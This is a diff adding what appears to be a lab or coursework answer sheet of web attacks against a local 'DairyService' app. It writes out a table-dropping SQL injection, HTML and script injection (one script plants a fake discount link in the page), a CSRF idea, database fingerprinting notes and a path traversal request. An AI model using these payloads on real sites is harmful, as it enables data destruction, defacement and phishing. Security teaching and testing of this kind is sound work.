@@ -1,0 +1,70 @@
+NO1
+SQL injection in the register form.
+
+POST http://localhost:8188/DairyService.svc/register
+
+Content-Type: application/json;
+Content-Length: 88
+Request Payload:
+	{Address: "fake@fakeemail.com", Name:"fakename", Password:"'); DROP TABLE Users; --"}
+============================================================
+NO2
+HTML Injection in the comments area
+
+POST http://localhost:8188/DairyService.svc/comment?name=Read%20between%20lines
+
+Content-Length:23
+Content-Type: application /json
+
+Request payload:
+<hr> <p> Read </p> <hr>
+============================================================
+NO3
+POST http://localhost:8188/DairyService.svc/comment?name=another%20cow
+
+Content-Length: 116
+Content-Type: application /json
+
+Request payload: <img src="https://images.unsplash.com/photo-1564085352725-08da0272627d?ixlib=rb-1.2.1&w=1000&q=80" alt="cow">
+============================================================
+NO4
+POST: http://localhost:8188/DairyService.svc/comment?name=hacker
+
+Content-Length: 68;
+Content-Type: application /json
+
+Request Payload: <script type="application/javascript"> alert("fail");</script>
+
+
+
+============================================================
+NO5
+A Cross Site Request Forgery (CSRF) attack could be mounted onto this service via a pop-up advertisement or notification, initialised by some script(s) that are injected through user inputs.
+
+============================================================
+NO6
+POST: http://localhost:8188/DairyService.svc/comment?name=hacker
+
+Request Payload: <script type="application/javascript"> let p = document.createElement("p");p.appendChild(document.createTextNode("Click here for a discount on your next purchase!"));let a = document.createElement("a"); a.href="http:/maliciouswebsites.com";a.appendChild(p);document.getElementById("header").appendChild(a);</script>
+
+============================================================
+ 
+ CO1 SQLite, format 3;
+
+============================================================
+ 
+ CO2 There are three tables: Comments, Credentials and Items
+ 
+=============================================================
+ 
+ CO3 shiloh
+ 
+============================================================
+
+ CO4 
+ 
+============================================================
+ 
+ CO5 Request URL (GET): http://localhost:8188/DairyService.svc/itemimg?id=../../../Data/Images/248309242.jpg
+
+
